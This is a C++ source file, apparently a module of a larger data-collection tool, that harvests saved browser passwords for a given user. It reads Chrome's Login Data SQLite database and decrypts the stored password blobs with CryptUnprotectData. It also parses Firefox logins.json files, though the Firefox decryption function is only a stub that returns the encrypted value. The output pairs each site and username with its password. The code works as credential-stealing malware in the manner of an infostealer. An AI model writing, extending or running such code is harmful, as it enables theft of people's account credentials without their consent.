#include "SavedPasswordsDataSource.h"
#include "Logger.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <stdexcept>
#include <filesystem>
#include <sqlite3.h>
#include <windows.h>
#include <wincrypt.h>
#include <nlohmann/json.hpp>

std::unordered_map<std::string, std::string> SavedPasswordsDataSource::collect(const std::string &userId) {
    Logger::log(Logger::INFO, "Collecting saved passwords for user: " + userId);
    std::unordered_map<std::string, std::string> savedPasswords;

    try {
        auto chromePasswords = collectChromePasswords();
        savedPasswords.insert(chromePasswords.begin(), chromePasswords.end());

        auto firefoxPasswords = collectFirefoxPasswords();
        savedPasswords.insert(firefoxPasswords.begin(), firefoxPasswords.end());
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, "Failed to collect saved passwords: " + std::string(e.what()));
    }

    return savedPasswords;
}

std::unordered_map<std::string, std::string> SavedPasswordsDataSource::collectChromePasswords() {
    std::string chromeLoginDataPath = std::getenv("USERPROFILE");
    chromeLoginDataPath += "/AppData/Local/Google/Chrome/User Data/Default/Login Data";

    std::string query = "SELECT origin_url, username_value, password_value FROM logins";
    return collectPasswordsFromSQLite(chromeLoginDataPath, query, [](const void *passwordBlob, int passwordBlobSize) {
        DATA_BLOB encryptedPassword = { static_cast<DWORD>(passwordBlobSize), (BYTE*)passwordBlob };
        DATA_BLOB decryptedPassword;
        if (CryptUnprotectData(&encryptedPassword, nullptr, nullptr, nullptr, nullptr, 0, &decryptedPassword)) {
            std::string password(reinterpret_cast<char*>(decryptedPassword.pbData), decryptedPassword.cbData);
            LocalFree(decryptedPassword.pbData);
            return password;
        } else {
            throw std::runtime_error("Failed to decrypt Chrome password");
        }
    });
}

std::unordered_map<std::string, std::string> SavedPasswordsDataSource::collectFirefoxPasswords() {
    std::unordered_map<std::string, std::string> passwords;
    std::string firefoxLoginDataPath = std::getenv("APPDATA");
    firefoxLoginDataPath += "/Mozilla/Firefox/Profiles/";

    for (const auto &entry : std::filesystem::directory_iterator(firefoxLoginDataPath)) {
        if (entry.is_directory()) {
            std::string profilePath = entry.path().string() + "/logins.json";
            if (std::filesystem::exists(profilePath)) {
                std::ifstream file(profilePath);
                if (!file.is_open()) {
                    throw std::runtime_error("Failed to open Firefox logins file");
                }

                nlohmann::json jsonData;
                file >> jsonData;
                file.close();

                for (const auto &login : jsonData["logins"]) {
                    std::string url = login["hostname"];
                    std::string username = login["username"];
                    std::string encryptedPassword = login["password"];

                    std::string password = decryptFirefoxPassword(encryptedPassword);
                    passwords[url + " (" + username + ")"] = password;
                }
            }
        }
    }

    return passwords;
}

std::string SavedPasswordsDataSource::decryptFirefoxPassword(const std::string &encryptedPassword) {
    // Implement the decryption logic here based on your encryption scheme
    return encryptedPassword;
}

std::unordered_map<std::string, std::string> SavedPasswordsDataSource::collectPasswordsFromSQLite(const std::string &dbPath, const std::string &query, const std::function<std::string(const void*, int)>& decryptFunc) {
    std::unordered_map<std::string, std::string> passwords;

    if (!std::filesystem::exists(dbPath)) {
        throw std::runtime_error("Database file not found: " + dbPath);
    }

    sqlite3 *db;
    if (sqlite3_open(dbPath.c_str(), &db) != SQLITE_OK) {
        throw std::runtime_error("Failed to open database: " + dbPath);
    }

    sqlite3_stmt *stmt;
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, 0) != SQLITE_OK) {
        sqlite3_close(db);
        throw std::runtime_error("Failed to prepare query: " + query);
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        const void* passwordBlob = sqlite3_column_blob(stmt, 2);
        int passwordBlobSize = sqlite3_column_bytes(stmt, 2);

        try {
            std::string decryptedPassword = decryptFunc(passwordBlob, passwordBlobSize);
            passwords[url + " (" + username + ")"] = decryptedPassword;
        } catch (const std::exception& e) {
            Logger::log(Logger::ERROR, "Failed to decrypt password for " + url + ": " + e.what());
        }
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return passwords;
}

